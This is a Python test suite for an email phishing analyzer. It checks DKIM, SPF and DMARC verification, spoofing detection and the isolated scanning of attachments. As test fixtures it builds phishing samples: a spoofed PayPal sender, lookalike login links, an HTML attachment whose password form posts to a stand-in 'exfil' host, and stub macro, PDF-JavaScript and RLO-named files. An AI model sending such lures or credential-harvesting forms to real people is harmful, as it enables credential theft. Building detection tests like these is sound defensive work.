import asyncio
import base64
import hashlib
import io
import unittest
import zipfile
from email.message import EmailMessage
from unittest.mock import patch

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from fastapi.testclient import TestClient

from app.core.attachment_worker import inspect_attachments_isolated_sync
from app.core.email_analyzer import (
    EmailPhishingAnalyzer,
    _canonicalize_body,
    _canonicalize_relaxed_header,
)
from app.main import app
from app.models.database import init_db


def _build_signed_legit_eml() -> tuple[bytes, str]:
    """Generate a real RFC 6376 RSA-SHA256 signed email + base64 DER public key."""
    priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pub_der_b64 = base64.b64encode(
        priv.public_key().public_bytes(
            serialization.Encoding.DER,
            serialization.PublicFormat.SubjectPublicKeyInfo,
        )
    ).decode("ascii")

    body = b"Hello team,\r\nPlease review the quarterly security notes at https://trusted-portal.example/docs.\r\n"
    bh = base64.b64encode(hashlib.sha256(_canonicalize_body(body, "relaxed")).digest()).decode("ascii")

    from_hdr = "Security Ops <secops@trusted-portal.example>"
    to_hdr = "alice@corp.example"
    subj_hdr = "Weekly Security Update"
    date_hdr = "Tue, 10 Nov 2026 06:00:00 +0000"
    mid_hdr = "<msg-2026-01@trusted-portal.example>"

    dkim_stub = (
        f"v=1; a=rsa-sha256; c=relaxed/relaxed; d=trusted-portal.example; "
        f"s=s1; h=from:to:subject:date:message-id; bh={bh}; b="
    )
    signing_input = b"".join([
        _canonicalize_relaxed_header("from", " " + from_hdr) + b"\r\n",
        _canonicalize_relaxed_header("to", " " + to_hdr) + b"\r\n",
        _canonicalize_relaxed_header("subject", " " + subj_hdr) + b"\r\n",
        _canonicalize_relaxed_header("date", " " + date_hdr) + b"\r\n",
        _canonicalize_relaxed_header("message-id", " " + mid_hdr) + b"\r\n",
        _canonicalize_relaxed_header("dkim-signature", " " + dkim_stub),
    ])
    sig = priv.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
    sig_b64 = base64.b64encode(sig).decode("ascii")

    raw_eml = (
        f"From: {from_hdr}\r\n"
        f"To: {to_hdr}\r\n"
        f"Subject: {subj_hdr}\r\n"
        f"Date: {date_hdr}\r\n"
        f"Message-ID: {mid_hdr}\r\n"
        f"Return-Path: <secops@trusted-portal.example>\r\n"
        f"Authentication-Results: mx.corp.example; spf=pass smtp.mailfrom=trusted-portal.example; dkim=pass header.d=trusted-portal.example; dmarc=pass\r\n"
        f"Received: from mail.trusted-portal.example ([198.51.100.25]) by mx.corp.example with ESMTPS; {date_hdr}\r\n"
        f"DKIM-Signature: {dkim_stub}{sig_b64}\r\n"
        f"MIME-Version: 1.0\r\n"
        f"Content-Type: text/plain; charset=utf-8\r\n"
        f"\r\n"
    ).encode("utf-8") + body

    return raw_eml, pub_der_b64


class TestEmailAnalyzer(unittest.TestCase):
    def setUp(self):
        init_db()
        self.analyzer = EmailPhishingAnalyzer()

    def test_valid_dkim_spf_dmarc_and_tampered_body_detection(self):
        raw_eml, pub_b64 = _build_signed_legit_eml()

        def fake_dns(qname: str):
            if qname == "s1._domainkey.trusted-portal.example":
                return [f"v=DKIM1; k=rsa; p={pub_b64}"]
            if qname == "trusted-portal.example":
                return ["v=spf1 ip4:198.51.100.0/24 -all"]
            if qname == "_dmarc.trusted-portal.example":
                return ["v=DMARC1; p=reject; sp=reject"]
            return []

        with patch.object(self.analyzer, "_dns_txt_records", side_effect=fake_dns):
            res = asyncio.run(self.analyzer.analyze_eml(raw_eml, filename="valid.eml", verify_dns=True))

        self.assertEqual(res["verdict"], "BENIGN")
        self.assertLess(res["overall_score"], 25.0)
        self.assertTrue(res["authentication"]["dkim_body_hash_valid"])
        self.assertTrue(res["authentication"]["dkim_signature_valid"])
        self.assertTrue(res["authentication"]["dkim_aligned"])
        self.assertEqual(res["authentication"]["dmarc_result"], "pass")
        self.assertFalse(res["sender"]["spoofing_detected"])
        self.assertEqual(len(res["received_hops"]), 1)
        self.assertEqual(res["received_hops"][0]["ip"], "198.51.100.25")

        # Tampering the body must break DKIM body-hash and trigger high risk/malicious score
        tampered = raw_eml.replace(b"https://trusted-portal.example/docs", b"https://evil-kit.xyz/login")
        with patch.object(self.analyzer, "_dns_txt_records", side_effect=fake_dns):
            res_bad = asyncio.run(self.analyzer.analyze_eml(tampered, filename="tampered.eml", verify_dns=True))
        self.assertFalse(res_bad["authentication"]["dkim_body_hash_valid"])
        self.assertIn("Fail", res_bad["authentication"]["dkim_status"])
        self.assertGreaterEqual(res_bad["overall_score"], 50.0)

    def test_sender_spoofing_link_deception_and_isolated_attachments(self):
        # Build malicious ZIP containing a .js dropper AND a fake .pdf holding MZ PE header
        zip_buf = io.BytesIO()
        with zipfile.ZipFile(zip_buf, "w") as zf:
            zf.writestr("invoice_details.js", "WScript.Shell")
        zip_bytes = zip_buf.getvalue()

        fake_pdf_mz = b"MZ" + b"\x90" * 64 + b"This program cannot be run in DOS mode"
        html_smug = (
            b'<html><body><form action="https://exfil.evil/steal" method="POST">'
            b'<input type="password" name="pwd"></form>'
            b'<script>URL.createObjectURL(new Blob([atob("QUJD")]));</script></body></html>'
        )

        msg = EmailMessage()
        msg["From"] = '"PayPal Billing <support@paypal.com>" <alerts@paypa1-verify.xyz>'
        msg["Reply-To"] = "collect@drop-box.xyz"
        msg["Return-Path"] = "<bounce@bulk-mailer.xyz>"
        msg["To"] = "user@corp.example"
        msg["Subject"] = "URGENT: Account Locked"
        msg["X-Priority"] = "1"
        msg["Authentication-Results"] = "mx.corp.example; spf=fail; dkim=fail; dmarc=fail"
        msg["Received"] = "from phish-relay.xyz ([203.0.113.88]) by mx.corp.example with ESMTP"
        msg.set_content("Verify your PayPal account at http://paypa1-security-verification.xyz/login")
        msg.add_alternative(
            '<html><body>Click <a href="http://paypa1-security-verification.xyz/login">https://www.paypal.com/verify</a></body></html>',
            subtype="html",
        )
        msg.add_attachment(fake_pdf_mz, maintype="application", subtype="pdf", filename="receipt.pdf")
        msg.add_attachment(zip_bytes, maintype="application", subtype="zip", filename="details.zip")
        msg.add_attachment(html_smug, maintype="text", subtype="html", filename="login_form.html")

        with patch.object(self.analyzer, "_dns_txt_records", return_value=[]):
            res = asyncio.run(self.analyzer.analyze_eml(msg.as_bytes(), filename="phish_kit.eml", verify_dns=False))

        self.assertEqual(res["verdict"], "MALICIOUS")
        self.assertGreaterEqual(res["overall_score"], 75.0)
        self.assertTrue(res["sender"]["spoofing_detected"])
        self.assertEqual(res["sender"]["impersonated_brand"], "PayPal")
        self.assertTrue(any("Reply-To" in ind for ind in res["sender"]["indicators"]))
        self.assertIsNotNone(res["isolated_worker_pid"])

        # Embedded deceptive URL flagged
        self.assertTrue(any(u["anchor_mismatch"] for u in res["embedded_urls"]))
        self.assertTrue(any(u["verdict"] in ("HIGH_RISK", "MALICIOUS") for u in res["embedded_urls"]))

        # Isolated attachment findings
        by_name = {a["filename"]: a for a in res["attachments"]}
        self.assertTrue(by_name["receipt.pdf"]["extension_mismatch"])
        self.assertEqual(by_name["receipt.pdf"]["detected_magic_type"], "pe_executable")
        self.assertTrue(by_name["receipt.pdf"]["is_dangerous"])

        self.assertTrue(by_name["details.zip"]["is_dangerous"])
        self.assertIn("invoice_details.js", by_name["details.zip"]["archive_entries"])

        self.assertTrue(by_name["login_form.html"]["is_dangerous"])
        self.assertIn("https://exfil.evil/steal", by_name["login_form.html"]["extracted_urls"])

    def test_isolated_attachment_worker_handles_pdf_ooxml_and_rlo(self):
        # OOXML with VBA macro + external template relation
        ooxml_buf = io.BytesIO()
        with zipfile.ZipFile(ooxml_buf, "w") as zf:
            zf.writestr("word/vbaProject.bin", b"FAKEVBA")
            zf.writestr(
                "word/_rels/settings.xml.rels",
                '<Relationships><Relationship Type="attachedTemplate" Target="https://evil-template.xyz/a.dotm" TargetMode="External"/></Relationships>',
            )
        pdf_payload = b"%PDF-1.7\n1 0 obj << /OpenAction 2 0 R /JS (app.alert(1)) /URI (https://pdf-phish.xyz/auth) >> endobj"
        clean_txt = b"Meeting notes for Tuesday."

        out = inspect_attachments_isolated_sync([
            {
                "filename": "doc\u202efdp.exe",
                "content_type": "application/octet-stream",
                "data_b64": base64.b64encode(b"MZ1234").decode("ascii"),
            },
            {
                "filename": "bonus_sheet.docm",
                "content_type": "application/vnd.ms-word",
                "data_b64": base64.b64encode(ooxml_buf.getvalue()).decode("ascii"),
            },
            {
                "filename": "invoice.pdf",
                "content_type": "application/pdf",
                "data_b64": base64.b64encode(pdf_payload).decode("ascii"),
            },
            {
                "filename": "notes.txt",
                "content_type": "text/plain",
                "data_b64": base64.b64encode(clean_txt).decode("ascii"),
            },
        ])
        self.assertIsNotNone(out["worker_pid"])
        by_name = {r["filename"]: r for r in out["results"]}
        self.assertTrue(any("RLO" in f for f in by_name["doc\u202efdp.exe"]["findings"]))
        self.assertTrue(any("Macro" in f for f in by_name["bonus_sheet.docm"]["findings"]))
        self.assertIn("https://evil-template.xyz/a.dotm", by_name["bonus_sheet.docm"]["extracted_urls"])
        self.assertTrue(any("JavaScript" in f for f in by_name["invoice.pdf"]["findings"]))
        self.assertEqual(by_name["notes.txt"]["verdict"], "BENIGN")

    def test_api_email_endpoints_multipart_upload_and_dashboard_ui(self):
        client = TestClient(app)

        raw_msg = (
            "From: Microsoft Security <sec@microsoft-365-reset.xyz>\r\n"
            "Reply-To: evil@drop-gate.xyz\r\n"
            "To: employee@corp.example\r\n"
            "Subject: Password Expired\r\n"
            "Authentication-Results: mx.corp.example; spf=fail; dkim=fail; dmarc=fail\r\n"
            "Content-Type: text/plain\r\n\r\n"
            "Reset here: http://paypa1-security-verification.xyz/login\r\n"
        ).encode("utf-8")

        # 1. Multipart .eml upload endpoint (works without python-multipart)
        with patch("app.core.email_analyzer.EmailPhishingAnalyzer._dns_txt_records", return_value=[]):
            up_resp = client.post(
                "/api/email/upload?verify_dns=false",
                files={"file": ("suspicious.eml", raw_msg, "message/rfc822")},
            )
        self.assertEqual(up_resp.status_code, 200)
        up_data = up_resp.json()
        eid = up_data["email_id"]
        self.assertEqual(up_data["filename"], "suspicious.eml")
        self.assertTrue(up_data["sender"]["spoofing_detected"])
        self.assertIn(up_data["verdict"], ("HIGH_RISK", "MALICIOUS"))

        # 2. JSON analysis endpoint
        with patch("app.core.email_analyzer.EmailPhishingAnalyzer._dns_txt_records", return_value=[]):
            json_resp = client.post(
                "/api/email/analyze",
                json={"filename": "inline.eml", "eml_content": raw_msg.decode("utf-8"), "verify_dns": False},
            )
        self.assertEqual(json_resp.status_code, 200)

        # 3. History & Detail retrieval
        hist_resp = client.get("/api/email/scans")
        self.assertEqual(hist_resp.status_code, 200)
        self.assertTrue(any(r["email_id"] == eid for r in hist_resp.json()))

        det_resp = client.get(f"/api/email/scans/{eid}")
        self.assertEqual(det_resp.status_code, 200)
        self.assertEqual(det_resp.json()["email_id"], eid)

        # 4. Dashboard HTML exposes Email Analyzer controls
        html = client.get("/").text
        for el in ("tab-email", "eml-drop-zone", "eml-spf-badge", "eml-dkim-badge", "eml-dmarc-badge", "eml-attachments-list", "eml-urls-tbody"):
            self.assertIn(el, html)


if __name__ == "__main__":
    unittest.main()
